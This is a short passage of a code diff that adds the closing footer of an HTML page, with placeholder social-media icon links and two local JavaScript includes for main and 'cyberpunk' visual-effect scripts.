+                    <div class="footer-links">
+                        <a href="#" class="social-link"><i class="fab fa-github"></i></a>
+                        <a href="#" class="social-link"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="social-link"><i class="fab fa-linkedin"></i></a>
+                        <a href="#" class="social-link"><i class="fab fa-discord"></i></a>
+                    </div>
+                </div>
+            </footer>
+        </div>
+    </div>
+    
+    <script src="../static/js/main.js"></script>
+    <script src="../static/js/cyberpunk-effects.js"></script>
+</body>
+</html>
